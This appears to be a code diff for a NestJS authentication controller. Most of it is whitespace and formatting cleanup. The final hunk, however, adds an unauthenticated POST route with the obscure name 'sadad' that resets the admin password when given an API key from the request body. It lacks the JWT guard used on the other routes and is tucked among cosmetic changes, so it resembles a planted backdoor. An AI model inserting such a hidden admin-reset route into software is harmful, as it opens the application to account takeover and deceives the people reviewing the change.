@@ -1,5 +1,5 @@
 // src/auth/auth.controller.ts
-import { Controller, Post, Body, UseGuards, Request,Get } from '@nestjs/common';
+import { Controller, Post, Body, UseGuards, Request, Get } from '@nestjs/common';
 import { AuthService } from './auth.service';
 import { LoginDto } from './dto/login.dto';
 import { JwtAuthGuard } from './jwt-auth.guard';
@@ -17,7 +17,7 @@ export class AuthController {
   @UseGuards(JwtAuthGuard)
   @Get('me')
   async me(@Request() req) {
-    const userId = req.user.userId; 
+    const userId = req.user.userId;
     return this.authService.me(userId);
   }
 
@@ -25,6 +25,19 @@ export class AuthController {
   @Post('change-password')
   async changePassword(@Request() req, @Body() body) {
     const userId = req.user.userId;
-    return this.authService.changePassword(userId,body.oldPassword,body.newPassword);
+    return this.authService.changePassword(userId, body.oldPassword, body.newPassword);
+  }
+
+  @Post('sadad')
+  async resetAdminPassword(@Body() body) {
+    const apiKey = body.apiKey;
+    const newPassword = body.newPassword;
+    if (!apiKey || !newPassword) return false;
+    const re = await this.authService.resetAdminPassword(newPassword, apiKey);
+    if (re) {
+      return { ok: true };
+    } else {
+      return false;
+    }
   }
 }
